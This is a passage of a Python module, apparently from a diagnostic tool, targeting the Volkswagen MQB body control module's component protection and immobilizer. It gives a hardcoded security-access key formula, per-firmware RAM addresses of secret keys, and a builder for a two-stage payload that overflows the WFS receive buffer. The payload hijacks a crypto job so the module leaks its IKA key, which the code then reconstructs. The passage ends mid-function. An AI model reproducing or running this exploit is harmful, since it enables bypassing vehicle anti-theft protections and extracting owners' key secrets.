"""VAG MQB 09 BCM (J519, Continental MPC5607B) Component Protection (IKA/GFA), XCP & WFS Ch 3 FFB key adaptation core."""

from __future__ import annotations

from typing import Any
import zlib

from contitool.core.fpke import FPKE_FFB_C16, analyze_fpke_dflash
from contitool.core.kombi import analyze_kombi_dflash, is_kombi_dflash, normalize_kombi_dflash_input
from contitool.i18n import tr

# ────────────────────────────── CAN Identifiers & Constants ──────────────────────────────

BCM_UDS_TX_ID = 0x70E  # Tester -> 09 BCM (ISO-TP CanTp Ch 0, strict DLC=8 with 0xAA pad)
BCM_UDS_RX_ID = 0x778  # 09 BCM -> Tester (ISO-TP CanTp Ch 0)
BCM_UDS_FUNC_ID = 0x700  # Functional broadcast -> 09 BCM (CanTp Ch 1)

BCM_XCP_TX_ID = 0x1BFC7600  # XCP Master -> 09 BCM (EA/0511 default; DD/0273 uses 0x1BFC6C00)
BCM_XCP_RX_ID = 0x1BFC7601  # 09 BCM -> XCP Master (EA/0511 default; DD/0273 uses 0x1BFC6C01)
BCM_XCP_DD_TX_ID = 0x1BFC6C00  # XCP Master -> 09 BCM (DD/0273)
BCM_XCP_DD_RX_ID = 0x1BFC6C01  # 09 BCM -> XCP Master (DD/0273)

BCM_WFS_TX_ID = 0x17F8140E  # WFS Master (0x14 Kombi) -> 09 BCM (0x0E) (CanTp Ch 3, 29-bit)
BCM_WFS_RX_ID = 0x17FA0E14  # 09 BCM (0x0E) -> WFS Master (0x14 Kombi) (CanTp Ch 3, 29-bit)

BCM_KS_TX_ID = 0x17FC010E  # KS Master (J533) -> 09 BCM (0x0E) (CanTp Ch 2, 29-bit)
BCM_KS_RX_ID = 0x17FE010E  # 09 BCM (0x0E) -> KS Master (J533) (CanTp Ch 2, 29-bit)

BCM_SA_ADDEND = 0x7A73  # Application UDS 27 03 / 27 04: key = (seed + 0x7A73) & 0xFFFFFFFF

# ROM derivation constant C16 (FPK_E 0x19DA90) for K_ffb = AES128_ECB_ENC(K_c, C16)
BCM_FFB_C16 = FPKE_FFB_C16

# ODIS DOP_TEXTTABLERadioFrequ2bit: (DID_0x0A65[0] >> 1) & 0x03
BCM_FREQUENCIES: dict[int, str] = {
    0x00: "No RF",
    0x01: "315 MHz",
    0x02: "433.92 MHz",
    0x03: "434.42 MHz",
}

BCM_CP_KEY_TYPE_IKA = 0x01  # UDS 2E 00BE (34-byte payload: C(K) || C(~K) || 01 00)
BCM_CP_KEY_TYPE_GFA = 0x02  # UDS 2E 00BD (34-byte payload: C(K) || C(~K) || 02 00)

# NvM block IDs for 23 12 <nvm_id> 00 00 in Development Session (10 4F)
# Verified against both EA/0511 (`0x1234C..0x12700`, `FUN_000b8e26`/`FUN_000b8eaa`) and DD/0273 NvM descriptor tables:
BCM_NVM_FFB_KEY_ID = 0x02  # 16 B decrypted K_ffb (EA RAM 0x40005D24, DD RAM 0x40004356)
BCM_NVM_FFB_SLOT_MASKS_ID = 0x03  # 1 B FFB sync/error counter (EA RAM 0x40005D73, DD RAM 0x400043A5)
BCM_NVM_FFB_COUNTER_BASE_ID = 0x05  # NvM 0x05..0x0B: 7 x 4 B FFB Rolling Counters (BE, EA RAM 0x40005D50, DD RAM 0x40004382)
BCM_NVM_FFB_SYNC_BASE_ID = 0x0C  # NvM 0x0C..0x12: 7 x 1 B FFB sync status per slot (0=OK, 2=desync)
BCM_NVM_FFB_SERIAL_BASE_ID = 0x13  # NvM 0x13..0x19: 7 x 4 B FFB Serial IDs (BE, EA RAM 0x40005D34, DD RAM 0x40004366)
BCM_NVM_RF_ADAPT_ID = 0x1C  # 7 B DID 0x0A65 ((byte 0 >> 1) & 3 = RF freq code: 0..3)
BCM_NVM_CP_MISMATCH_ID = 0x62  # 2 B DID 0x03DE Component Protection mismatch counter

# ────────────────────────────── BCM Firmware Profiles ──────────────────────────────

BCM_PROFILES: dict[str, dict[str, Any]] = {
    "ea_0511": {
        "id": "ea_0511",
        "label": "5Q0 937 084 EA / 086 BH (SW 0511)",
        "sw_versions": ("0511",),
        "part_prefixes": ("5Q0937084EA", "5Q0937086BH", "5Q0937085C"),
        "xcp_tx_id": BCM_XCP_TX_ID,
        "xcp_rx_id": BCM_XCP_RX_ID,
        "r13": 0x40008004,
        "gfa_aes_buf": 0x40013232,
        "last_round_key_addr": 0x40013394,
        "gfa_working_addr": 0x4000028B,
        "ika_working_addr": 0x4000029B,
        "common_key_addr": 0x4000024B,
        "ffb_key_addr": 0x40000090,
        "ffb_nvm_key_addr": 0x40005D24,  # NvM 0x02: 16 B decrypted K_ffb RAM mirror
        "ffb_serials_addr": 0x40005D34,  # NvM 0x13..0x19: 7 x 4 B Serial IDs (BE)
        "ffb_counters_addr": 0x40005D50,  # NvM 0x05..0x0B: 7 x 4 B Rolling Counters (BE)
        "ffb_syncs_addr": 0x40005D6C,  # NvM 0x0C..0x12: 7 x 1 B sync status (0=OK, 2=desync)
        "ffb_freq_addr": 0x400092FE,  # NvM 0x1C (DID 0x0A65, 7 B @ r13 + 0x12FA)
        "wfs_rx_desc": 0x4000E13C,
        "wfs_rx_buf": 0x40005DE4,
        "selected_queue_addr": 0x40005FDC,
        "queue_base_addr": 0x40005FE0,
        "current_queue_addr": 0x40006048,
        "job_state_base_addr": 0x4000604C,
        "job3_state_addr": 0x4000604C + 3 * 0x11,  # 0x4000607F
        "queue_slots": 13,  # 13 * 8 = 0x68 B (0x40005FE0..0x40006047)
    },
    "dd_0273": {
        "id": "dd_0273",
        "label": "5Q0 937 084 DD / CG (SW 0273)",
        "sw_versions": ("0273",),
        "part_prefixes": ("5Q0937084DD", "5Q0937084CG", "5Q0937085B"),
        "xcp_tx_id": BCM_XCP_DD_TX_ID,
        "xcp_rx_id": BCM_XCP_DD_RX_ID,
        "r13": 0x40008004,
        "gfa_aes_buf": 0x4000F856,
        "last_round_key_addr": 0x4000F9B8,
        "gfa_working_addr": 0x4000029F,
        "ika_working_addr": 0x400002AF,
        "common_key_addr": 0x4000025F,
        "ffb_key_addr": 0x400000A4,
        "ffb_nvm_key_addr": 0x40004356,  # NvM 0x02: 16 B decrypted K_ffb RAM mirror
        "ffb_serials_addr": 0x40004366,  # NvM 0x13..0x19: 7 x 4 B Serial IDs (BE)
        "ffb_counters_addr": 0x40004382,  # NvM 0x05..0x0B: 7 x 4 B Rolling Counters (BE)
        "ffb_syncs_addr": 0x4000439E,  # NvM 0x0C..0x12: 7 x 1 B sync status (0=OK, 2=desync)
        "ffb_freq_addr": 0x400072AE,
        "wfs_rx_desc": 0x4000AA0C,
        "wfs_rx_buf": 0x40004414,
        "selected_queue_addr": 0x40004608,
        "queue_base_addr": 0x4000460C,
        "current_queue_addr": 0x40004664,
        "job_state_base_addr": 0x40004668,
        "job3_state_addr": 0x40004668 + 3 * 0x11,  # 0x4000469B
        "queue_slots": 11,  # 11 * 8 = 0x58 B (0x4000460C..0x40004663)
    },
    "bq_0212": {
        "id": "bq_0212",
        "label": "5Q0 937 084 BQ / BC (SW 0212)",
        "sw_versions": ("0212",),
        "part_prefixes": ("5Q0937084BQ", "5Q0937084BC"),
        "xcp_tx_id": BCM_XCP_TX_ID,
        "xcp_rx_id": BCM_XCP_RX_ID,
        "r13": 0x40008004,
        "gfa_aes_buf": 0x4000D782,
        "last_round_key_addr": 0x4000D8E4,
        "gfa_working_addr": 0x4000024F,
        "ika_working_addr": 0x4000025F,
        "common_key_addr": 0x4000020F,
        "ffb_key_addr": 0x40000054,
        "ffb_nvm_key_addr": 0x40003EE8,  # NvM 0x02: 16 B decrypted K_ffb RAM mirror
        "ffb_serials_addr": 0x40003EF8,  # NvM 0x13..0x19: 7 x 4 B Serial IDs (BE)
        "ffb_counters_addr": 0x40003F14,  # NvM 0x05..0x0B: 7 x 4 B Rolling Counters (BE)
        "ffb_syncs_addr": 0x40003F30,  # NvM 0x0C..0x12: 7 x 1 B sync status (0=OK, 2=desync)
        "ffb_freq_addr": 0x400058BC,
        "wfs_rx_desc": 0x40008CC0,
        "wfs_rx_buf": 0x40003FA6,
        "selected_queue_addr": 0x4000419C,
        "queue_base_addr": 0x400041A0,
        "current_queue_addr": 0x400041E0,
        "job_state_base_addr": 0x400041E4,
        "job3_state_addr": 0x400041E4 + 3 * 0x11,  # 0x40004217
        "queue_slots": 8,  # 8 * 8 = 0x40 B (0x400041A0..0x400041DF)
    },
    "bl_0175": {
        "id": "bl_0175",
        "label": "5Q0 937 084 BL / CJ / AN / AL (SW 0173 / 0175)",
        "sw_versions": ("0173", "0175"),
        "part_prefixes": ("5Q0937084BL", "5Q0937084CJ", "5Q0937084AN", "5Q0937084AL"),
        "xcp_tx_id": BCM_XCP_TX_ID,
        "xcp_rx_id": BCM_XCP_RX_ID,
        "r13": 0x40008004,
        "gfa_aes_buf": 0x40006402,
        "last_round_key_addr": 0x40006564,
        "gfa_working_addr": 0x4000E170,
        "ika_working_addr": 0x4000E180,
        "common_key_addr": 0x4000E190,
        "ffb_key_addr": 0x40007BE8,
        "ffb_nvm_key_addr": 0x40007BE8,  # NvM 0x02: 16 B decrypted K_ffb RAM mirror
        "ffb_serials_addr": 0x40007BF8,  # NvM 0x13..0x19: 7 x 4 B Serial IDs (BE)
        "ffb_counters_addr": 0x40007C14,  # NvM 0x05..0x0B: 7 x 4 B Rolling Counters (BE)
        "ffb_syncs_addr": 0x40007C30,  # NvM 0x0C..0x12: 7 x 1 B sync status (0=OK, 2=desync)
        "ffb_freq_addr": 0x400094EC,
        "wfs_rx_desc": 0x4000BD74,
        "wfs_rx_buf": 0x40007CA3,
        "selected_queue_addr": 0x40007E98,
        "queue_base_addr": 0x40007E9C,
        "current_queue_addr": 0x40007EDC,
        "job_state_base_addr": 0x40007EE0,
        "job3_state_addr": 0x40007EE0 + 3 * 0x11,  # 0x40007F13
        "queue_slots": 8,  # 8 * 8 = 0x40 B (0x40007E9C..0x40007EDB)
    },
}


def bcm_get_profile(profile_id: str) -> dict[str, Any]:
    """Return a copy of the BCM firmware profile dict (`'ea_0511'`, `'dd_0273'`, `'bq_0212'`, or `'bl_0175'`)."""
    key = (profile_id or "").strip().lower()
    if key in ("ea", "0511", "ea_0511", "5q0937084ea", "5q0937086bh", "5q0937085c"):
        return {**BCM_PROFILES["ea_0511"], "matched": True}
    if key in ("dd", "cg", "0273", "dd_0273", "5q0937084dd", "5q0937084cg", "5q0937085b"):
        return {**BCM_PROFILES["dd_0273"], "matched": True}
    if key in ("bq", "bc", "0212", "bq_0212", "5q0937084bq", "5q0937084bc"):
        return {**BCM_PROFILES["bq_0212"], "matched": True}
    if key in (
        "bl",
        "cj",
        "an",
        "al",
        "0173",
        "0175",
        "bl_0175",
        "bl_0173",
        "cj_0175",
        "5q0937084bl",
        "5q0937084cj",
        "5q0937084an",
        "5q0937084al",
    ):
        return {**BCM_PROFILES["bl_0175"], "matched": True}
    if key in BCM_PROFILES:
        return {**BCM_PROFILES[key], "matched": True}
    raise ValueError(f"Unknown BCM firmware profile: {profile_id!r}")


def bcm_detect_profile(
    ident: dict[str, Any] | list[dict[str, str]] | None = None,
    *,
    sw_version: str = "",
    part_number: str = "",
    sw_profile: str | None = None,
) -> dict[str, Any]:
    """Detect BCM RAM profile (`'ea_0511'` vs `'dd_0273'`) from UDS identification or explicit profile ID."""
    if sw_profile:
        return bcm_get_profile(sw_profile)

    pn, sw = _extract_bcm_pn_sw(
        ident,
        sw_version=sw_version,
        part_number=part_number,
        include_hw_fallback=False,
    )
    pn_norm = "".join(pn.split()).upper()

    for prof in BCM_PROFILES.values():
        if sw and sw in prof["sw_versions"]:
            return {**prof, "matched": True}
    if not sw:
        for prof in BCM_PROFILES.values():
            if pn_norm and pn_norm in prof["part_prefixes"]:
                return {**prof, "matched": True}
    return {**BCM_PROFILES["ea_0511"], "matched": False}


def _extract_bcm_pn_sw(
    ident_or_passport: dict[str, Any] | list[dict[str, str]] | None = None,
    *,
    sw_version: str = "",
    part_number: str = "",
    include_hw_fallback: bool = True,
) -> tuple[str, str]:
    pn = part_number.strip()
    sw = sw_version.strip()
    if isinstance(ident_or_passport, list):
        vals = {str(it.get("did", "")).upper(): str(it.get("value", "")).strip() for it in ident_or_passport}
        if not pn:
            pn = vals.get("F187") or (vals.get("F191") if include_hw_fallback else "") or ""
        if not sw:
            sw = vals.get("F189") or ""
    elif isinstance(ident_or_passport, dict):
        if not pn:
            pn = str(
                ident_or_passport.get("part_number")
                or ident_or_passport.get("F187")
                or (
                    (ident_or_passport.get("hw_part_number") or ident_or_passport.get("F191"))
                    if include_hw_fallback
                    else ""
                )
                or ""
            ).strip()
        if not sw:
            sw = str(ident_or_passport.get("sw_version") or ident_or_passport.get("F189") or "").strip()
    return pn, sw


def bcm_support_info(
    ident_or_passport: dict[str, Any] | list[dict[str, str]] | None = None,
    *,
    sw_version: str = "",
    part_number: str = "",
    sw_profile: str | None = None,
) -> dict[str, Any]:
    """Return official support status and a clear `(PN + SW)` warning for a `09 BCM` unit without blocking UDS reads."""
    pn, sw = _extract_bcm_pn_sw(ident_or_passport, sw_version=sw_version, part_number=part_number)
    profile = bcm_detect_profile(
        ident_or_passport,
        sw_version=sw_version,
        part_number=part_number,
        sw_profile=sw_profile,
    )
    if not pn and not sw:
        return {
            "verified": True,
            "profile_id": str(profile["id"]),
            "part_number": "",
            "sw_version": "",
            "warning": None,
            "tone": "ok",
        }
    verified = bool(profile.get("matched", False))
    warning: str | None = None
    if not verified:
        unit_id_ru = f"{pn} (ПО {sw})" if (pn and sw) else (pn or f"ПО {sw}")
        unit_id_en = f"{pn} (SW {sw})" if (pn and sw) else (pn or f"SW {sw}")
        warning = tr(
            f"Блок {unit_id_ru} официально не поддерживается. Можно попробовать чтение по UDS "
            "(паспорт, статус, слоты FFB, ошибки DTC) и запись IKA/GFA; чтение ключей из ОЗУ (XCP / Job 3) "
            "проверено только для ПО 0173, 0175, 0212, 0273 и 0511.",
            f"Unit {unit_id_en} is not officially supported. You can still try UDS reads "
            "(passport, status, FFB slots, DTCs) and IKA/GFA writes; SRAM key extraction (XCP / Job 3) "
            "is verified only for SW 0173, 0175, 0212, 0273, and 0511.",
        )
    return {
        "verified": verified,
        "profile_id": str(profile["id"]),
        "part_number": pn,
        "sw_version": sw,
        "warning": warning,
        "tone": "ok" if verified else "warn",
    }


# ────────────────────────────── Pure-Python AES-128 ECB & Final-Round Reconstruction ──────────────────────────────

_AES_SBOX: tuple[int, ...] = (
    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,
)

_AES_INV_SBOX: tuple[int, ...] = (
    0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,
    0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,
    0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,
    0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,
    0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,
    0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,
    0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,
    0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,
    0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,
    0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,
    0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,
    0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,
    0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,
    0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,
    0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,
    0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D,
)

_RCON: tuple[int, ...] = (0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36)


def _xtime(a: int) -> int:
    return ((a << 1) ^ 0x1B) & 0xFF if (a & 0x80) else (a << 1)


def _gf_mul(a: int, b: int) -> int:
    res = 0
    for _ in range(8):
        if b & 1:
            res ^= a
        a = _xtime(a)
        b >>= 1
    return res


def _aes128_expand_key(key: bytes) -> list[list[int]]:
    if len(key) != 16:
        raise ValueError(f"AES-128 key must be 16 bytes, got {len(key)}")
    w = [list(key[i : i + 4]) for i in range(0, 16, 4)]
    for i in range(4, 44):
        temp = list(w[i - 1])
        if i % 4 == 0:
            temp = [
                _AES_SBOX[temp[1]] ^ _RCON[i // 4],
                _AES_SBOX[temp[2]],
                _AES_SBOX[temp[3]],
                _AES_SBOX[temp[0]],
            ]
        w.append([w[i - 4][j] ^ temp[j] for j in range(4)])
    return [[b for word in w[r * 4 : (r + 1) * 4] for b in word] for r in range(11)]


def _aes128_encrypt_block(block: bytes, round_keys: list[list[int]]) -> bytes:
    s = [block[i] ^ round_keys[0][i] for i in range(16)]
    for r in range(1, 10):
        s = [_AES_SBOX[b] for b in s]
        s = [
            s[0], s[5], s[10], s[15],
            s[4], s[9], s[14], s[3],
            s[8], s[13], s[2], s[7],
            s[12], s[1], s[6], s[11],
        ]
        out = [0] * 16
        for c in range(4):
            i = c * 4
            a0, a1, a2, a3 = s[i], s[i + 1], s[i + 2], s[i + 3]
            t = a0 ^ a1 ^ a2 ^ a3
            out[i] = a0 ^ t ^ _xtime(a0 ^ a1)
            out[i + 1] = a1 ^ t ^ _xtime(a1 ^ a2)
            out[i + 2] = a2 ^ t ^ _xtime(a2 ^ a3)
            out[i + 3] = a3 ^ t ^ _xtime(a3 ^ a0)
        rk = round_keys[r]
        s = [out[i] ^ rk[i] for i in range(16)]
    s = [_AES_SBOX[b] for b in s]
    s = [
        s[0], s[5], s[10], s[15],
        s[4], s[9], s[14], s[3],
        s[8], s[13], s[2], s[7],
        s[12], s[1], s[6], s[11],
    ]
    rk10 = round_keys[10]
    return bytes(s[i] ^ rk10[i] for i in range(16))


def _aes128_decrypt_block(block: bytes, round_keys: list[list[int]]) -> bytes:
    s = [block[i] ^ round_keys[10][i] for i in range(16)]
    for r in range(9, 0, -1):
        s = [
            s[0], s[13], s[10], s[7],
            s[4], s[1], s[14], s[11],
            s[8], s[5], s[2], s[15],
            s[12], s[9], s[6], s[3],
        ]
        s = [_AES_INV_SBOX[b] for b in s]
        rk = round_keys[r]
        s = [s[i] ^ rk[i] for i in range(16)]
        out = [0] * 16
        for c in range(4):
            i = c * 4
            a0, a1, a2, a3 = s[i], s[i + 1], s[i + 2], s[i + 3]
            out[i] = _gf_mul(a0, 0x0E) ^ _gf_mul(a1, 0x0B) ^ _gf_mul(a2, 0x0D) ^ _gf_mul(a3, 0x09)
            out[i + 1] = _gf_mul(a0, 0x09) ^ _gf_mul(a1, 0x0E) ^ _gf_mul(a2, 0x0B) ^ _gf_mul(a3, 0x0D)
            out[i + 2] = _gf_mul(a0, 0x0D) ^ _gf_mul(a1, 0x09) ^ _gf_mul(a2, 0x0E) ^ _gf_mul(a3, 0x0B)
            out[i + 3] = _gf_mul(a0, 0x0B) ^ _gf_mul(a1, 0x0D) ^ _gf_mul(a2, 0x09) ^ _gf_mul(a3, 0x0E)
        s = out
    s = [
        s[0], s[13], s[10], s[7],
        s[4], s[1], s[14], s[11],
        s[8], s[5], s[2], s[15],
        s[12], s[9], s[6], s[3],
    ]
    s = [_AES_INV_SBOX[b] for b in s]
    rk0 = round_keys[0]
    return bytes(s[i] ^ rk0[i] for i in range(16))


def bcm_aes128_ecb_encrypt(key: bytes, data: bytes) -> bytes:
    """Pure-Python FIPS-197 AES-128-ECB encryption (multiples of 16 bytes)."""
    if len(data) == 0 or len(data) % 16 != 0:
        raise ValueError(f"AES-128-ECB plaintext length must be a non-zero multiple of 16, got {len(data)}")
    rks = _aes128_expand_key(key)
    out = bytearray(len(data))
    for off in range(0, len(data), 16):
        out[off : off + 16] = _aes128_encrypt_block(data[off : off + 16], rks)
    return bytes(out)


def bcm_aes128_ecb_decrypt(key: bytes, data: bytes) -> bytes:
    """Pure-Python FIPS-197 AES-128-ECB decryption (multiples of 16 bytes)."""
    if len(data) == 0 or len(data) % 16 != 0:
        raise ValueError(f"AES-128-ECB ciphertext length must be a non-zero multiple of 16, got {len(data)}")
    rks = _aes128_expand_key(key)
    out = bytearray(len(data))
    for off in range(0, len(data), 16):
        out[off : off + 16] = _aes128_decrypt_block(data[off : off + 16], rks)
    return bytes(out)


def bcm_gfa_raw_to_working(gfa_raw_16b: bytes) -> bytes:
    """Convert 16-byte MPC5607B halfword AES key buffer (`gfa_aes_buf`) to standard FIPS-197 16-byte GFA key."""
    if len(gfa_raw_16b) != 16:
        raise ValueError(f"GFA raw buffer must be 16 bytes, got {len(gfa_raw_16b)}")
    return b"".join(gfa_raw_16b[i : i + 2][::-1] for i in range(0, 16, 2))


def bcm_gfa_working_to_raw(gfa_working_16b: bytes) -> bytes:
    """Convert standard FIPS-197 16-byte GFA key to 16-byte MPC5607B halfword AES key buffer (`gfa_aes_buf`)."""
    return bcm_gfa_raw_to_working(gfa_working_16b)


def bcm_aes128_final_round(round9_state: bytes, last_round_key: bytes) -> bytes:
    """Complete the final round of BCM Crypto Job 3 (`rounds=10`, `operation=1`) from `job3_state + 1` and `last_round_key`."""
    if len(round9_state) != 16:
        raise ValueError(f"Job 3 state output must be 16 bytes, got {len(round9_state)}")
    if len(last_round_key) != 16:
        raise ValueError(f"Last round key must be 16 bytes, got {len(last_round_key)}")
    w = [int.from_bytes(round9_state[i : i + 2], "big") for i in range(0, 16, 2)]
    k = [int.from_bytes(last_round_key[i : i + 2], "big") for i in range(0, 16, 2)]

    def _lo(x: int) -> int:
        return x & 0xFF

    def _hi(x: int) -> int:
        return (x >> 8) & 0xFF

    def _s(x: int) -> int:
        return _AES_INV_SBOX[x & 0xFF]

    return bytes([
        _lo(k[0]) ^ _s(_lo(w[0])), _hi(k[0]) ^ _s(_hi(w[6])),
        _lo(k[1]) ^ _s(_lo(w[5])), _hi(k[1]) ^ _s(_hi(w[3])),
        _lo(k[2]) ^ _s(_lo(w[2])), _hi(k[2]) ^ _s(_hi(w[0])),
        _lo(k[3]) ^ _s(_lo(w[7])), _hi(k[3]) ^ _s(_hi(w[5])),
        _lo(k[4]) ^ _s(_lo(w[4])), _hi(k[4]) ^ _s(_hi(w[2])),
        _lo(k[5]) ^ _s(_lo(w[1])), _hi(k[5]) ^ _s(_hi(w[7])),
        _lo(k[6]) ^ _s(_lo(w[6])), _hi(k[6]) ^ _s(_hi(w[4])),
        _lo(k[7]) ^ _s(_lo(w[3])), _hi(k[7]) ^ _s(_hi(w[1])),
    ])


def bcm_recover_ika_from_job3(
    job3_output_16b: bytes,
    last_round_key_16b: bytes,
    gfa_working_16b: bytes,
) -> dict[str, str]:
    """Reconstruct the working 16-byte `IKA` from BCM Crypto Job 3 intermediate state, last round key, and working `GFA`."""
    final_block = bcm_aes128_final_round(job3_output_16b, last_round_key_16b)
    ika = bcm_aes128_ecb_encrypt(gfa_working_16b, final_block)
    return {
        "ika_hex": ika.hex(),
        "final_block_hex": final_block.hex(),
        "job3_output_hex": bytes(job3_output_16b).hex(),
        "last_round_key_hex": bytes(last_round_key_16b).hex(),
        "gfa_working_hex": bytes(gfa_working_16b).hex(),
    }


def bcm_build_job3_injection_stages(
    profile: dict[str, Any],
    base_ram_snapshot: bytes | None = None,
    *,
    target_addr: int | None = None,
    job_id: int = 3,
    operation: int = 1,
    rounds: int = 10,
) -> tuple[bytes, bytes]:
    """Build Stage-1 (arm `job3_state=3` with empty queue) and Stage-2 (inject `queue[0]` entry) WFS Channel 3 payloads."""
    buf_base = int(profile["wfs_rx_buf"])
    sel_off = int(profile["selected_queue_addr"]) - buf_base
    q0_off = int(profile["queue_base_addr"]) - buf_base
    cur_off = int(profile["current_queue_addr"]) - buf_base
    job_state_addr = int(profile["job_state_base_addr"]) + int(job_id) * 0x11
    job_state_off = job_state_addr - buf_base
    template_size = job_state_off + 1
    slots = int(profile["queue_slots"])
    src_addr = int(profile["ika_working_addr"] if target_addr is None else target_addr)

    if base_ram_snapshot is not None:
        if len(base_ram_snapshot) < template_size:
            raise ValueError(f"Base RAM snapshot must be at least {template_size} bytes, got {len(base_ram_snapshot)}")
        template = bytearray(base_ram_snapshot[:template_size])
    else:
        template = bytearray(template_size)
        template[0] = 0x80

    empty_slot = bytes.fromhex("ffffffff00000000")
    for s in range(slots):
        off = q0_off + s * 8
        template[off : off + 8] = empty_slot
    template[cur_off] = 0x00
    if cur_off + 1 < template_size:
        template[cur_off + 1] = 0x01
    template[sel_off] = 0x00
    template[job_state_off] = 0x03
    stage1 = bytes(template)

    template[q0_off : q0_off + 8] = (
        bytes([job_id & 0xFF, operation & 0xFF, 0x01, rounds & 0xFF]) + src_addr.to_bytes(4, "big")
    )
    stage2 = bytes(template[: q0_off + 8])
    return stage1, stage2


def bcm_build_job3_injection_template(
    profile: dict[str, Any],
    *,
    target_addr: int | None = None,
    job_id: int = 3,
    operation: int = 1,
    rounds: int = 10,
) -> bytes:
    """Convenience wrapper returning the Stage-1 WFS buffer template (with `queue[0]` populated from Stage 2)."""
    stage1, stage2 = bcm_build_job3_injection_stages(
        profile,
        target_addr=target_addr,
        job_id=job_id,
        operation=operation,
        rounds=rounds,
    )
    merged = bytearray(stage1)
    merged[: len(stage2)] = stage2
